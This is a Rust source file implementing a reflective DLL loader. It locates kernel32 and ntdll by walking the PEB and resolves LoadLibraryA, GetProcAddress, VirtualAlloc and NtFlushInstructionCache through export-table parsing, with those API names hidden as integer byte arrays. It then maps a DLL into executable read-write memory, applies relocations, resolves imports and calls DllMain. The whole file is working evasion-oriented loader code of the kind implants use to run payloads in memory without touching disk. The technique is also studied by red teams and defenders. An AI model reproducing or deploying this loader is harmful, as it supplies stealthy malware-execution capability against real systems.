use std::{arch::asm, mem::size_of};

use winapi::{um::{winnt::{PIMAGE_DOS_HEADER, IMAGE_DIRECTORY_ENTRY_EXPORT, PIMAGE_EXPORT_DIRECTORY, PIMAGE_SECTION_HEADER, IMAGE_DIRECTORY_ENTRY_IMPORT, PIMAGE_IMPORT_DESCRIPTOR, PIMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, PIMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, DLL_PROCESS_ATTACH, IMAGE_REL_BASED_HIGHLOW}}, shared::{minwindef::{HMODULE, FARPROC, LPVOID, DWORD, HINSTANCE, BOOL}, ntdef::{LPCSTR, HANDLE, PVOID, NTSTATUS}, basetsd::SIZE_T}, ctypes::c_void};
use ntapi::{ntpebteb::PTEB, ntldr::{PLDR_DATA_TABLE_ENTRY}, ntpsapi::PEB_LDR_DATA};

#[cfg(target_arch = "x86")]
use winapi::{um::winnt::{PIMAGE_NT_HEADERS32, PIMAGE_THUNK_DATA32, IMAGE_SNAP_BY_ORDINAL32, IMAGE_ORDINAL32}};

#[cfg(target_arch = "x86_64")]
use winapi::{um::winnt::{PIMAGE_NT_HEADERS64, PIMAGE_THUNK_DATA64, IMAGE_SNAP_BY_ORDINAL64, IMAGE_ORDINAL64}};


#[allow(non_camel_case_types)]
type fnLoadLibraryA = unsafe extern "system" fn(lpFileName: LPCSTR) -> HMODULE;

#[allow(non_camel_case_types)]
type fnGetProcAddress = unsafe extern "system" fn(
    hModule: HMODULE, 
    lpProcName: LPCSTR
) -> FARPROC;

#[allow(non_camel_case_types)]
type fnNtFlushInstructionCache = unsafe extern "system" fn(
    ProcessHandle: HANDLE, 
    BaseAddress: PVOID, 
    Length: SIZE_T
) -> NTSTATUS;


#[allow(non_camel_case_types)]
type fnVirtualAlloc = unsafe extern "system" fn(
    lpAddress: LPVOID, 
    dwSize: SIZE_T, 
    flAllocationType: DWORD, 
    flProtect: DWORD
) -> LPVOID;

#[allow(non_camel_case_types)]
type fnDllMain = unsafe extern "system" fn(
    module: HINSTANCE,
    call_reason: DWORD,
    reserved: LPVOID,
) -> BOOL;

// Function pointers (Thanks B3NNY)
static mut LOAD_LIBRARY_A: Option<fnLoadLibraryA> = None;
static mut GET_PROC_ADDRESS: Option<fnGetProcAddress> = None;
static mut VIRTUAL_ALLOC: Option<fnVirtualAlloc> = None;
static mut NT_FLUSH_INSTRUCTION_CACHE: Option<fnNtFlushInstructionCache> = None;

/// Performs a Reflective DLL Injection
#[no_mangle]
pub extern "system" fn reflective_loader(dll_bytes: *mut c_void) {

    let module_base = dll_bytes as usize;

    let dos_header = module_base as PIMAGE_DOS_HEADER;
    //log::info!("[+] IMAGE_DOS_HEADER: {:?}", dos_header);

    #[cfg(target_arch = "x86")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32 };
    #[cfg(target_arch = "x86_64")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64 };
    //log::info!("[+] IMAGE_NT_HEADERS: {:?}", nt_headers);

    //LOAD_LIBRARY_A, GET_PROC_ADDRESS, VIRTUAL_ALLOC, NT_FLUSH_INSTRUCTION_CACHE
    set_exported_functions_by_name();

    //log::info!("[+] Copying Sections");
    let new_module_base = unsafe { copy_sections_to_local_process(module_base) };
    //log::info!("[+] New Module Base: {:?}", new_module_base);
    

    unsafe { copy_headers(module_base as _, new_module_base) };


    // STEP 3: process all of our images relocations...
    //log::info!("[+] Rebasing Image");
    unsafe { rebase_image(module_base, new_module_base) };

    // STEP 4: process our images import table...
    //log::info!("[+] Resolving Imports");
    unsafe { resolve_imports(new_module_base as _) };

    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };

    // STEP 5: call our images entry point
    let entry_point = unsafe { new_module_base as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };
    //log::info!("[+] New Module Base {:?} + AddressOfEntryPoint {:#x} = {:#x}", new_module_base, unsafe { (*nt_headers).OptionalHeader.AddressOfEntryPoint }, entry_point);

    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };



    // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
    unsafe { NT_FLUSH_INSTRUCTION_CACHE.unwrap()(-1 as _, std::ptr::null_mut(), 0) };

    //log::info!("[+] Calling DllMain");
    
    #[allow(non_snake_case)]
    let DllMain = unsafe { std::mem::transmute::<_, fnDllMain>(entry_point) };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };
    unsafe { asm!("nop") };

    // STEP 6: The DLLMain function to be executed
    unsafe { DllMain(std::ptr::null_mut(), DLL_PROCESS_ATTACH, std::ptr::null_mut()) };

    // STEP 7: return our new entry point address so whatever called us can call DllMain() if needed.
    //return;
}


/// Rebase the image / perform image base relocation
#[no_mangle]
unsafe fn rebase_image(module_base: usize, new_module_base: *mut c_void) {

    let dos_header = module_base as PIMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;

    // Calculate the difference between remote allocated memory region where the image will be loaded and preferred ImageBase (delta)
    let delta = new_module_base as isize - (*nt_headers).OptionalHeader.ImageBase as isize;
    //log::info!("[+] Allocated Memory: {:?} - ImageBase: {:#x} = Delta: {:#x}", new_module_base, (*nt_headers).OptionalHeader.ImageBase, delta);

    // Return early if delta is 0
    if delta == 0 {
        return;
    }

    // Calcuate the dos/nt headers of new_module_base
    // Resolve the imports of the newly allocated memory region 

    let dos_header = new_module_base as PIMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = (new_module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers = (new_module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;

    // Get a pointer to the first _IMAGE_BASE_RELOCATION
    let mut base_relocation = (new_module_base as usize 
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize) as PIMAGE_BASE_RELOCATION;
    
    //log::info!("[+] IMAGE_BASE_RELOCATION: {:?}", base_relocation);

    // Get the end of _IMAGE_BASE_RELOCATION
    let base_relocation_end = base_relocation as usize 
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;
    
    while (*base_relocation).VirtualAddress != 0u32 && (*base_relocation).VirtualAddress as usize <= base_relocation_end && (*base_relocation).SizeOfBlock != 0u32 {
        
        // Get the VirtualAddress, SizeOfBlock and entries count of the current _IMAGE_BASE_RELOCATION block
        let address = (new_module_base as usize + (*base_relocation).VirtualAddress as usize) as isize;
        let item = (base_relocation as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;
        let count = ((*base_relocation).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / std::mem::size_of::<u16>() as usize;

        for i in 0..count {
            // Get the Type and Offset from the Block Size field of the _IMAGE_BASE_RELOCATION block
            let type_field = item.offset(i as isize).read() >> 12;
            let offset = item.offset(i as isize).read() & 0xFFF;

            //IMAGE_REL_BASED_DIR32 does not exist
            //#define IMAGE_REL_BASED_DIR64   10
            if type_field == IMAGE_REL_BASED_DIR64 || type_field == IMAGE_REL_BASED_HIGHLOW {
                // Add the delta to the value of each address where the relocation needs to be performed
                *((address + offset as isize) as *mut isize) += delta;
            }
        }

        // Get a pointer to the next _IMAGE_BASE_RELOCATION
        base_relocation = (base_relocation as usize + (*base_relocation).SizeOfBlock as usize) as PIMAGE_BASE_RELOCATION;
    }
}

/// Resolve the image imports
#[no_mangle]
unsafe fn resolve_imports(new_module_base: *mut c_void) {
    let dos_header = new_module_base as PIMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = (new_module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers = (new_module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;

    // Get a pointer to the first _IMAGE_IMPORT_DESCRIPTOR
    let mut import_directory = (new_module_base as usize 
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize) as PIMAGE_IMPORT_DESCRIPTOR;
    
    //log::info!("[+] IMAGE_IMPORT_DESCRIPTOR {:?}", import_directory);

    while (*import_directory).Name != 0 {

        // Get the name of the dll in the current _IMAGE_IMPORT_DESCRIPTOR
        let dll_name = (new_module_base as usize 
            + (*import_directory).Name as usize) as *const i8;        
        
            // Load the DLL in the in the address space of the process
        let dll_handle = LOAD_LIBRARY_A.unwrap()(dll_name); //call function pointer LOAD_LIBRARY_A

        // Get a pointer to the OriginalFirstThunk in the current _IMAGE_IMPORT_DESCRIPTOR
        #[cfg(target_arch = "x86")]
        let mut original_first_thunk = (new_module_base as usize 
            + *(*import_directory).u.OriginalFirstThunk() as usize) as PIMAGE_THUNK_DATA32;

        // Get a pointer to the OriginalFirstThunk in the current _IMAGE_IMPORT_DESCRIPTOR
        #[cfg(target_arch = "x86_64")]
        let mut original_first_thunk = (new_module_base as usize 
            + *(*import_directory).u.OriginalFirstThunk() as usize) as PIMAGE_THUNK_DATA64;

        // Get a pointer to the FirstThunk in the current _IMAGE_IMPORT_DESCRIPTOR
        #[cfg(target_arch = "x86")]
        let mut thunk = (new_module_base as usize 
            + (*import_directory).FirstThunk as usize) 
            as PIMAGE_THUNK_DATA32;
        
        // Get a pointer to the FirstThunk in the current _IMAGE_IMPORT_DESCRIPTOR
        #[cfg(target_arch = "x86_64")]
        let mut thunk = (new_module_base as usize 
            + (*import_directory).FirstThunk as usize) 
            as PIMAGE_THUNK_DATA64;
 
        while (*original_first_thunk).u1.Function() != &0 {
            // Get a pointer to _IMAGE_IMPORT_BY_NAME
            let thunk_data = (new_module_base as usize
                + *(*original_first_thunk).u1.AddressOfData() as usize)
                as PIMAGE_IMPORT_BY_NAME;

            #[cfg(target_arch = "x86")]
            // #define IMAGE_SNAP_BY_ORDINAL32(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG32) != 0)
            let result = IMAGE_SNAP_BY_ORDINAL32(*(*original_first_thunk).u1.Ordinal());

            // #define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0)
            #[cfg(target_arch = "x86_64")]
            let result = IMAGE_SNAP_BY_ORDINAL64(*(*original_first_thunk).u1.Ordinal());

            if result {
                //#define IMAGE_ORDINAL32(Ordinal) (Ordinal & 0xffff)
                #[cfg(target_arch = "x86")]
                let fn_ordinal = IMAGE_ORDINAL32(*(*original_first_thunk).u1.Ordinal()) as _;

                //#define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)
                #[cfg(target_arch = "x86_64")]
                let fn_ordinal = IMAGE_ORDINAL64(*(*original_first_thunk).u1.Ordinal()) as _;

                *(*thunk).u1.Function_mut() = GET_PROC_ADDRESS.unwrap()(dll_handle, fn_ordinal) as _; // call function pointer GET_PROC_ADDRESS
            } else {
                // Get a pointer to the function name in the IMAGE_IMPORT_BY_NAME
                let fn_name = (*thunk_data).Name.as_ptr();
                // Retrieve the address of the exported function from the DLL and ovewrite the value of "Function" in the IMAGE_THUNK_DATA64
                *(*thunk).u1.Function_mut() = GET_PROC_ADDRESS.unwrap()(dll_handle, fn_name) as _; // call function pointer GET_PROC_ADDRESS
            }

            // Increment Thunk and OriginalFirstThunk
            thunk = thunk.offset(1);
            original_first_thunk = original_first_thunk.offset(1);
        }

        // Get a pointer to the next _IMAGE_IMPORT_DESCRIPTOR
        import_directory = (import_directory as usize + size_of::<IMAGE_IMPORT_DESCRIPTOR>() as usize) as _;
    }
}

/// Copy headers into the target memory location
#[no_mangle]
unsafe fn copy_headers(module_base: *const u8, new_module_base: *mut c_void) {
    let dos_header = module_base as PIMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;

    for i in 0..(*nt_headers).OptionalHeader.SizeOfHeaders {
        new_module_base.cast::<u8>().add(i as usize).write(module_base.add(i as usize).read());
    }

}

// Copy sections of the dll to a memory location
#[no_mangle]
unsafe fn copy_sections_to_local_process(module_base: usize) -> *mut c_void { //Vec<u8>
    
    let dos_header = module_base as PIMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;

    let image_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;
    let preferred_image_base_rva = (*nt_headers).OptionalHeader.ImageBase as *mut c_void;

    //Heap or VirtualAlloc (RWX or RW and later X)
    //let mut image = vec![0; image_size];
    let mut new_module_base = VIRTUAL_ALLOC.unwrap()(preferred_image_base_rva, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    //log::info!("[+] New Module Base: {:?}", new_module_base);
    
    if new_module_base.is_null() {
        new_module_base = VIRTUAL_ALLOC.unwrap()(std::ptr::null_mut(), image_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }

    // get a pointer to the _IMAGE_SECTION_HEADER
    let section_header = (&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as PIMAGE_SECTION_HEADER;

    //log::info!("[+] IMAGE_SECTION_HEADER {:?}", section_header);

    for i in 0..(*nt_headers).FileHeader.NumberOfSections {
        // get a reference to the current _IMAGE_SECTION_HEADER
        let section_header_i = &*(section_header.add(i as usize));

        // get the pointer to current section header's virtual address
        //let destination = image.as_mut_ptr().add(section_header_i.VirtualAddress as usize);
        let destination = new_module_base.cast::<u8>().add(section_header_i.VirtualAddress as usize);
        //log::info!("[+] destination: {:?}", de    stination);
        
        // get a pointer to the current section header's data
        let source = module_base as usize + section_header_i.PointerToRawData as usize;
        //log::info!("[+] source: {:#x}", source);
        
        // get the size of the current section header's data
        let size = section_header_i.SizeOfRawData as usize;
        //log::info!("Size: {:?}", size);

        // copy section headers into the local process (allocated memory)
        /* 
        std::ptr::copy_nonoverlapping(
            source as *const std::os::raw::c_void, // this causes problems if it is winapi::ctypes::c_void but ffi works for ffi
            destination as *mut _,
            size,
        )*/

        let source_data = core::slice::from_raw_parts(source as *const u8, size);
        
        for x in 0..size {
            let src_data = source_data[x];
            let dest_data = destination.add(x);
            *dest_data = src_data;
        }

    }

    new_module_base
}

#[no_mangle]
fn get_peb_ldr() -> usize {
    let teb: PTEB;
	unsafe {
        #[cfg(target_arch = "x86")]
		asm!("mov {teb}, fs:[0x18]", teb = out(reg) teb);

		#[cfg(target_arch = "x86_64")]
		asm!("mov {teb}, gs:[0x30]", teb = out(reg) teb);
	}

	let teb = unsafe { &mut *teb };
	let peb = unsafe { &mut *teb.ProcessEnvironmentBlock };
	let peb_ldr = peb.Ldr;

    peb_ldr as _
}

/// Gets the modules and module exports by name and saves their addresses
#[no_mangle]
pub fn set_exported_functions_by_name() {

    let kernel32_bytes: [u16; 13] = [75, 69, 82, 78, 69, 76, 51, 50, 46, 68, 76, 76, 0];
    let ntdll_bytes: [u16; 10] = [110, 116, 100, 108, 108, 46, 100, 108, 108, 0];

    let load_librarya_bytes: [i8; 13] = [76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 65, 0];
    let get_proc_address_bytes: [i8; 15] = [71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0];
    let virtual_alloc_bytes: [i8; 13] = [86, 105, 114, 116, 117, 97, 108, 65, 108, 108, 111, 99, 0];
    let nt_flush_instruction_cache_bytes: [i8; 24] = [78, 116, 70, 108, 117, 115, 104, 73, 110, 115, 116, 114, 117, 99, 116, 105, 111, 110, 67, 97, 99, 104, 101, 0];


    // get kernel32 base address via name
    let kernel32_base = unsafe { get_loaded_modules_by_name(kernel32_bytes.as_ptr()).expect("failed to kernel32 by name") };
    //log::info!("[+] KERNEL32: {:?}", kernel32_base);
    
    // get ntdll base address via name
    let ntdll_base = unsafe {  get_loaded_modules_by_name(ntdll_bytes.as_ptr()).expect("failed to ntdll by name") };
    //log::info!("[+] NTDLL: {:?}", ntdll_base);

    // get exports by name and store the their virtual address
    //kernel32
    let loadlibrarya_address = unsafe { get_module_exports(kernel32_base, load_librarya_bytes.as_ptr()).expect("failed to get LoadLibraryA by name") };
    unsafe { LOAD_LIBRARY_A = Some(std::mem::transmute::<_, fnLoadLibraryA>(loadlibrarya_address)) };
    //log::info!("[+] LoadLibraryA {:?}", loadlibrarya_address);

    let getprocaddress_address = unsafe { get_module_exports(kernel32_base, get_proc_address_bytes.as_ptr()).expect("failed to get GetProcAddress by name") };
    unsafe { GET_PROC_ADDRESS = Some(std::mem::transmute::<_, fnGetProcAddress>(getprocaddress_address)) };
    //log::info!("[+] GetProcAddress {:?}", getprocaddress_address);

    let virtualalloc_address = unsafe { get_module_exports(kernel32_base, virtual_alloc_bytes.as_ptr()).expect("failed to get VirtualAlloc by name") };
    unsafe { VIRTUAL_ALLOC = Some(std::mem::transmute::<_, fnVirtualAlloc>(virtualalloc_address)) };
    //log::info!("[+] VirtualAlloc {:?}", virtualalloc_address);

    //ntdll
    let ntflushinstructioncache_address = unsafe { get_module_exports(ntdll_base, nt_flush_instruction_cache_bytes.as_ptr()).expect("failed to get NtFlushInstructionCache by name") };
    unsafe { NT_FLUSH_INSTRUCTION_CACHE = Some(std::mem::transmute::<_, fnNtFlushInstructionCache>(ntflushinstructioncache_address)) };
    //log::info!("[+] NtFlushInstructionCache {:?}", ntflushinstructioncache_address);
}

/// Gets loaded modules by name
#[no_mangle]
pub unsafe fn get_loaded_modules_by_name(module_name: *const u16) -> Option<*mut u8> {
    let peb_ptr_ldr_data = get_peb_ldr() as *mut PEB_LDR_DATA;
    //log::info!("[+] PEB_LDR_DATA {:?}", peb_ptr_ldr_data);
	
    let mut module_list = (*peb_ptr_ldr_data).InLoadOrderModuleList.Flink as PLDR_DATA_TABLE_ENTRY;

    while !(*module_list).DllBase.is_null() {

        let dll_name = (*module_list).BaseDllName.Buffer;
        
        if compare_raw_str(module_name, dll_name) {
            return Some((*module_list).DllBase as _);
		}

        module_list = (*module_list).InLoadOrderLinks.Flink as PLDR_DATA_TABLE_ENTRY;
	}

    return None;
}

use num_traits::Num;
pub fn compare_raw_str<T>(s: *const T, u: *const T) -> bool
where
    T: Num,
{
    unsafe {
        let u_len = (0..).take_while(|&i| !(*u.offset(i)).is_zero()).count();
        let u_slice = core::slice::from_raw_parts(u, u_len);

        let s_len = (0..).take_while(|&i| !(*s.offset(i)).is_zero()).count();
        let s_slice = core::slice::from_raw_parts(s, s_len);

        if s_len != u_len {
            return false;
        }
        for i in 0..s_len {
            if s_slice[i] != u_slice[i] {
                return false;
            }
        }
        return true;
    }
}

/// Retrieves all function and addresses from the specfied modules
#[no_mangle]
unsafe fn get_module_exports(module_base: *mut u8, module_name: *const i8) -> Option<usize> {

    let dos_header = module_base as PIMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers =  (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS32;

    #[cfg(target_arch = "x86_64")]
    let nt_header = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS64;

    let export_directory = (module_base as usize
        + (*nt_header).OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as usize)
        as PIMAGE_EXPORT_DIRECTORY;

    let names = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNames as usize)
            as *const u32,
        (*export_directory).NumberOfNames as _,
    );

    let functions = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfFunctions as usize)
            as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );

    let ordinals = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNameOrdinals as usize)
            as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    //log::info!("[+] Module Base: {:?} Export Directory: {:?} AddressOfNames: {names:p}, AddressOfFunctions: {functions:p}, AddressOfNameOrdinals: {ordinals:p} ", module_base, export_directory);

    for i in 0..(*export_directory).NumberOfNames {

        let name = (module_base as usize + names[i as usize] as usize) as *const i8;

        if compare_raw_str(module_name, name as _) {
            let ordinal = ordinals[i as usize] as usize;
            return Some(module_base as usize + functions[ordinal] as usize);
        }
    }  
    None
}